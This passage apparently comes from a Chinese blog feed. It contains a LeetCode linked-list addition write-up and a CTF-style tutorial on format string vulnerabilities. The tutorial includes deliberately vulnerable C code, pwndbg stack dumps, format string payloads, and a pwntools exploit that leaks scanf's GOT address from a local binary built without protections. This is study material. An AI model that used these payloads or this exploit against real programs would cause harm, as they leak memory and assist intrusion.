    <content type="html"><![CDATA[<h1 id="错解"><a href="#错解" class="headerlink" title="错解"></a>错解</h1><p>怎么快速地将链表倒置</p><p>:confused:</p><p><img src="https://i.imgur.com/phNwhfi.png" alt="wrong"></p><p>最后还是因为溢出的问题</p><p>思路：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​        <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ListNode temp1 = l1;</span><br><span class="line"></span><br><span class="line">        ListNode temp2 = l2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> resultl1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> resultl2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (temp1 != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> tempvalue = temp1.val;</span><br><span class="line"></span><br><span class="line">            resultl1 = resultl1 + tempvalue * Math.pow(<span class="number">10</span>, k);</span><br><span class="line"></span><br><span class="line">            k++;</span><br><span class="line"></span><br><span class="line">            temp1 = temp1.next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>就是将其转化为整数，因为链表的第一个元素是最低位，之后是十位，百位等</p><p>将得到的结果在转化为链表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span> result = (<span class="keyword">int</span>) (resultl1 + resultl2);</span><br><span class="line"></span><br><span class="line">ListNode ans = <span class="keyword">new</span> ListNode(<span class="number">0</span>); <span class="comment">//先取一个头节点</span></span><br><span class="line"></span><br><span class="line">ListNode head = ans;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length = Integer.toString(result).length();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line"></span><br><span class="line">    ListNode temp = <span class="keyword">new</span> ListNode(result % <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    head.next = temp;</span><br><span class="line"></span><br><span class="line">    head = head.next;</span><br><span class="line"></span><br><span class="line">    result = result / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记录一下将整数转为string的操作</p><blockquote><p>Integer.toString(result)</p></blockquote><p>Math.pow函数的返回值必须是double类型的</p><p>但是这样会面临一个问题，也就是最开图片的那个，溢出！</p><h1 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h1><p>看了眼答案，才明白自己从开始就想错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123;</span><br><span class="line"></span><br><span class="line">    ListNode dummyHead = new ListNode(0);</span><br><span class="line"></span><br><span class="line">    ListNode p = l1, q = l2, curr = dummyHead;</span><br><span class="line"></span><br><span class="line">    int carry = 0;</span><br><span class="line"></span><br><span class="line">    while (p != null || q != null) &#123;</span><br><span class="line"></span><br><span class="line">        int x = (p != null) ? p.val : 0;</span><br><span class="line"></span><br><span class="line">        int y = (q != null) ? q.val : 0;</span><br><span class="line"></span><br><span class="line">        int sum = carry + x + y;</span><br><span class="line"></span><br><span class="line">        carry = sum / 10;</span><br><span class="line"></span><br><span class="line">        curr.next = new ListNode(sum % 10);</span><br><span class="line"></span><br><span class="line">        curr = curr.next;</span><br><span class="line"></span><br><span class="line">        if (p != null) p = p.next;</span><br><span class="line"></span><br><span class="line">        if (q != null) q = q.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (carry &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">        curr.next = new ListNode(carry);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return dummyHead.next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最关键的就是</p><p>==int x = (p != null) ? p.val : 0;</p><p>int y = (q != null) ? q.val : 0;</p><p>int sum = carry + x + y;</p><p>carry = sum / 10;</p><p>curr.next = new ListNode(sum % 10);==</p><p>其实只需要从低位开始一位位的加上去就好了。</p><p>然后再把它们给链起来</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;错解&quot;&gt;&lt;a href=&quot;#错解&quot; class=&quot;headerlink&quot; title=&quot;错解&quot;&gt;&lt;/a&gt;错解&lt;/h1&gt;&lt;p&gt;怎么快速地将链表倒置&lt;/p&gt;
&lt;p&gt;:confused:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/phNw
      
    
    </summary>
    
      <category term="leetcode" scheme="https://prontosil.club/categories/leetcode/"/>
    
    
      <category term="leetcode" scheme="https://prontosil.club/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串分析</title>
    <link href="https://prontosil.club/2019/05/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90/"/>
    <id>https://prontosil.club/2019/05/04/格式化字符串分析/</id>
    <published>2019-05-04T11:42:51.000Z</published>
    <updated>2019-05-04T11:43:51.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>这个题目是ctfwiki上的</p><p>c代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（突然发现腾讯文档居然还支持代码好强啊</p><p>我们编译一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o leakMemory  leakMemory.c -g</span><br></pre></td></tr></table></figure><p>把保护措施都关掉了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> % checksec leakMemory   </span><br><span class="line">[*] '/home/abc/Desktop/pwn/leakMemory/leakMemory'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>先看一下几个payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8048330</span></span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/abc/Desktop/pwn/leakMemory/leakMemory </span><br><span class="line">%<span class="number">08</span>x.%<span class="number">08</span>x.%<span class="number">08</span>x</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, __printf (format=<span class="number">0x8048593</span> <span class="string">"%08x.%08x.%08x.%s\n"</span>) at <span class="built_in">printf</span>.c:<span class="number">28</span></span><br><span class="line"><span class="number">28</span><span class="built_in">printf</span>.c: No such file <span class="keyword">or</span> directory.</span><br></pre></td></tr></table></figure><p>在printf处下断点<br>此时栈上的布局如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffcf9c</span> —▸ <span class="number">0x80484ea</span> (main+<span class="number">100</span>) ◂— add    esp, <span class="number">0x20</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffcfa0</span> —▸ <span class="number">0x8048593</span> ◂— <span class="keyword">and</span>    eax, <span class="number">0x2e783830</span> <span class="comment">/* '%08x.%08x.%08x.%s\n' */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│      <span class="number">0xffffcfa4</span> ◂— <span class="number">0x1</span></span><br><span class="line">03:000c│      0xffffcfa8 ◂— 0x22222222 ('""""')</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffcfac</span> ◂— <span class="number">0xffffffff</span></span><br><span class="line">05:0014│      0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x'</span><br></pre></td></tr></table></figure><p>continue一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">00000001.22222222</span>.ffffffff.%<span class="number">08</span>x.%<span class="number">08</span>x.%<span class="number">08</span>x</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, __printf (format=<span class="number">0xffffcfc0</span> <span class="string">"%08x.%08x.%08x"</span>) at <span class="built_in">printf</span>.c:<span class="number">28</span></span><br><span class="line"><span class="number">28</span>in <span class="built_in">printf</span>.c</span><br></pre></td></tr></table></figure><p>输出了信息的同时， 命中第二个断点</p><p>此时栈上的布局如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffcfac</span> —▸ <span class="number">0x80484f9</span> (main+<span class="number">115</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line">01:0004│      0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x'</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffcfb8</span> —▸ <span class="number">0xf7fcf410</span> —▸ <span class="number">0x8048278</span> ◂— inc    edi <span class="comment">/* 'GLIBC_2.0' */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffcfbc</span> —▸ <span class="number">0x804849d</span> (main+<span class="number">23</span>) ◂— add    ebx, <span class="number">0x1b63</span></span><br><span class="line">05:0014│ eax  0xffffcfc0 ◂— '%08x.%08x.%08x'</span><br><span class="line">06:0018│      0xffffcfc4 ◂— '.%08x.%08x'</span><br><span class="line">07:001c│      0xffffcfc8 ◂— 'x.%08x'</span><br></pre></td></tr></table></figure><p>此时printf函数会把格式化字符串之后的栈上的信息当作参数打印出来：<br>contiue一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffcfc0.f7fcf410<span class="number">.0804849</span>d[Inferior <span class="number">1</span> (process <span class="number">4975</span>) exited normally]</span><br></pre></td></tr></table></figure><p>之前栈上的信息显示的不全，栈的内存如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>x <span class="number">0xffffcfb0</span></span><br><span class="line"><span class="number">0xffffcfb0</span>:<span class="number">0xffffcfc0</span> <span class="number">0xffffcfc0</span> <span class="number">0xf7fcf410</span> <span class="number">0x0804849d</span></span><br><span class="line"><span class="number">0xffffcfc0</span>:<span class="number">0x78383025</span> <span class="number">0x3830252e</span> <span class="number">0x30252e78</span> <span class="number">0x00007838</span></span><br><span class="line"><span class="number">0xffffcfd0</span>:<span class="number">0x00000000</span> <span class="number">0x00c30000</span> <span class="number">0x00000000</span> <span class="number">0xf7ffd000</span></span><br><span class="line"><span class="number">0xffffcfe0</span>:<span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x6f984f00</span></span><br><span class="line"><span class="number">0xffffcff0</span>:<span class="number">0x00000009</span> <span class="number">0xffffd2a4</span> <span class="number">0xf7e094a9</span> <span class="number">0xf7fb4748</span></span><br></pre></td></tr></table></figure><p>0xffffcfb0 是格式化字符串的地址， 我们看到此时printf函数将0xffffcfc0 0xf7fcf410 0x0804849d<br>都打印出来了， 也就是格式化字符串之后的三个位置的信息</p><p>我们通过这种方式泄露栈的信息，但是也可以直接去取得栈中被视为第n+1个参数的值<br>至于为什么是第n+1, 这是因为格式化字符串是第一个参数</p><p>比如 通过 %3\$x(这个的原理是啥？为什么要加\$符号) 我们可以泄露栈上被视为第4个参数的值</p><p>栈布局如下：(左边的一列是栈地址，也就是内存的地址，箭头代表了这个内存单元存储的数据，如果是指针还会进一步指示)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffcfac</span> —▸ <span class="number">0x80484f9</span> (main+<span class="number">115</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line">01:0004│      0xffffcfb0 —▸ 0xffffcfc0 ◂— '%3$x'</span><br><span class="line">... ↓(这里是省略号，是不是就是直接指向了，中间那个就被跳过了)</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffcfb8</span> —▸ <span class="number">0xf7fcf410</span> —▸ <span class="number">0x8048278</span> ◂— inc    edi <span class="comment">/* 'GLIBC_2.0' */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffcfbc</span> —▸ <span class="number">0x804849d</span> (main+<span class="number">23</span>) ◂— add    ebx, <span class="number">0x1b63</span></span><br><span class="line">05:0014│ eax  0xffffcfc0 ◂— '%3$x'</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffffcfc4</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│      <span class="number">0xffffcfc8</span> —▸ <span class="number">0xf7ffd940</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>同样看不清， 还是直接打印内存信息吧(x命令的用法，这里显示的是内存地址从0xffffcfb0开始的，因为内存是按照字节编址的，所以一行正好是16个字节内存地址就是加10)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>x <span class="number">0xffffcfb0</span></span><br><span class="line"><span class="number">0xffffcfb0</span>:<span class="number">0xffffcfc0</span> <span class="number">0xffffcfc0</span> <span class="number">0xf7fcf410</span> <span class="number">0x0804849d</span> (<span class="number">0xffffcfb0</span>这个内存单元指向了<span class="number">0xffffcfc0</span>)</span><br><span class="line"><span class="number">0xffffcfc0</span>:<span class="number">0x78243325</span> <span class="number">0x00000000</span> <span class="number">0xf7ffd940</span> <span class="number">0x000000c2</span> (看内存单元<span class="number">0xffffcfc0</span>存放的内容就是x$<span class="number">3</span>%)</span><br><span class="line"><span class="number">0xffffcfd0</span>:<span class="number">0x00000000</span> <span class="number">0x00c30000</span> <span class="number">0x00000000</span> <span class="number">0xf7ffd000</span></span><br><span class="line"><span class="number">0xffffcfe0</span>:<span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0xd6a57700</span></span><br><span class="line"><span class="number">0xffffcff0</span>:<span class="number">0x00000009</span> <span class="number">0xffffd2a4</span> <span class="number">0xf7e094a9</span> <span class="number">0xf7fb4748</span></span><br></pre></td></tr></table></figure><p>猜猜这时候打印的信息是啥？<br>答案是栈上被视为第四个参数的信息： 0x0804849d</p><p>同样的我们还可以通过%s来得到字符串的信息</p><p>栈布局如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffcfac</span> —▸ <span class="number">0x80484f9</span> (main+<span class="number">115</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffcfb0</span> —▸ <span class="number">0xffffcfc0</span> ◂— <span class="number">0x7325</span> <span class="comment">/* '%s' */</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffcfb8</span> —▸ <span class="number">0xf7fcf410</span> —▸ <span class="number">0x8048278</span> ◂— inc    edi <span class="comment">/* 'GLIBC_2.0' */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffcfbc</span> —▸ <span class="number">0x804849d</span> (main+<span class="number">23</span>) ◂— add    ebx, <span class="number">0x1b63</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│ eax  <span class="number">0xffffcfc0</span> ◂— <span class="number">0x7325</span> <span class="comment">/* '%s' */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffffcfc4</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│      <span class="number">0xffffcfc8</span> —▸ <span class="number">0xf7ffd940</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>还是看不清，直接看内存吧(md 垃圾pwndbg)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>x <span class="number">0xffffcfb0</span></span><br><span class="line"><span class="number">0xffffcfb0</span>:<span class="number">0xffffcfc0</span> <span class="number">0xffffcfc0</span> <span class="number">0xf7fcf410</span> <span class="number">0x0804849d</span></span><br><span class="line"><span class="number">0xffffcfc0</span>:<span class="number">0x00007325</span> <span class="number">0x00000001</span> <span class="number">0xf7ffd940</span> <span class="number">0x000000c2</span></span><br><span class="line"><span class="number">0xffffcfd0</span>:<span class="number">0x00000000</span> <span class="number">0x00c30000</span> <span class="number">0x00000000</span> <span class="number">0xf7ffd000</span></span><br><span class="line"><span class="number">0xffffcfe0</span>:<span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0xf1ae2900</span></span><br><span class="line"><span class="number">0xffffcff0</span>:<span class="number">0x00000009</span> <span class="number">0xffffd2a4</span> <span class="number">0xf7e094a9</span> <span class="number">0xf7fb4748</span></span><br></pre></td></tr></table></figure><p>这个时候会直接将 0xffffcfc0 对应的字符串打印出来<br>结果自然就是 %s了</p><p>如果我们输入%2$s, 这个时候就很有趣了， 按照道理程序会将 0xf7fcf410 对应地址的当作字符串打印出来， 可是如果这个地址无效呢？<br>我自己尝试的结果是直接退出了，什么都没有打印出来emm</p><p>这时候如果我们指定一个合法的地址， 比如got表中某个函数的地址这就很神奇了</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sh = process(<span class="string">'./leakMemory'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">leakmemory = ELF(<span class="string">'./leakMemory'</span>)</span><br><span class="line"></span><br><span class="line">__isoc99_scanf_got = leakmemory.got[<span class="string">'__isoc99_scanf'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(__isoc99_scanf_got)</span><br><span class="line"></span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">'%4$s'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'%4$s'</span> <span class="comment">#这两个payload是自己测试的</span></span><br><span class="line">payload2 = <span class="string">'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'%4$s\n'</span>)</span><br><span class="line"><span class="comment">#print sh.recvuntil('%4$s\n')</span></span><br><span class="line"><span class="comment">#print '\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>])) <span class="comment"># remove the first bytes of __isoc99_scanf@got</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>我们运行这个exp<br>在pwndbg中下断点</p><p>运行到第二个printf的时候</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffa3bdfc</span> —▸ <span class="number">0x80484f9</span> (main+<span class="number">115</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffa3be00</span> —▸ <span class="number">0xffa3be10</span> —▸ <span class="number">0x804a014</span> (_GLOBAL_OFFSET_TABLE_+<span class="number">20</span>) —▸ <span class="number">0xf7df2bb0</span> (__isoc99_scanf) ◂— push   ebp</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffa3be08</span> —▸ <span class="number">0xf7f85410</span> —▸ <span class="number">0x8048278</span> ◂— inc    edi <span class="comment">/* 'GLIBC_2.0' */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffa3be0c</span> —▸ <span class="number">0x804849d</span> (main+<span class="number">23</span>) ◂— add    ebx, <span class="number">0x1b63</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│ eax  <span class="number">0xffa3be10</span> —▸ <span class="number">0x804a014</span> (_GLOBAL_OFFSET_TABLE_+<span class="number">20</span>) —▸ <span class="number">0xf7df2bb0</span> (__isoc99_scanf) ◂— push   ebp</span><br><span class="line">06:0018│      0xffa3be14 ◂— '%4$s'</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│      <span class="number">0xffa3be18</span> —▸ <span class="number">0xf7fb3900</span> (catch_hook) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>另一边</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] Waiting <span class="keyword">for</span> debugger: Done</span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">14</span> a0 <span class="number">04</span> <span class="number">08</span>  <span class="number">25</span> <span class="number">34</span> <span class="number">24</span> <span class="number">73</span>  <span class="number">0</span>a                        │····│%<span class="number">4</span>$s│·│</span><br><span class="line">    <span class="number">00000009</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">31</span>  <span class="number">2</span>e <span class="number">32</span> <span class="number">32</span> <span class="number">32</span>  <span class="number">32</span> <span class="number">32</span> <span class="number">32</span> <span class="number">32</span>  │<span class="number">0000</span>│<span class="number">0001</span>│<span class="number">.222</span>│<span class="number">2222</span>│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">32</span> <span class="number">2</span>e <span class="number">66</span> <span class="number">66</span>  <span class="number">66</span> <span class="number">66</span> <span class="number">66</span> <span class="number">66</span>  <span class="number">66</span> <span class="number">66</span> <span class="number">2</span>e <span class="number">14</span>  a0 <span class="number">04</span> <span class="number">08</span> <span class="number">25</span>  │<span class="number">2.f</span>f│ffff│ff.·│···%│</span><br><span class="line">    <span class="number">00000020</span>  <span class="number">34</span> <span class="number">24</span> <span class="number">73</span> <span class="number">0</span>a                                         │<span class="number">4</span>$s·││</span><br><span class="line">    <span class="number">00000024</span></span><br></pre></td></tr></table></figure><p>continue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x8</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">14</span> a0 <span class="number">04</span> <span class="number">08</span>  b0 <span class="number">2b</span> df f7                            │····│·+··││</span><br><span class="line">    <span class="number">00000008</span></span><br><span class="line"><span class="number">0xf7df2bb0</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process './leakMemory' stopped with exit code 0 (pid 5064)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br></pre></td></tr></table></figure><p>这个时候我们就得到了scanf函数的地址了<br>ok 还有几个地方没弄明白之后再写</p><h2 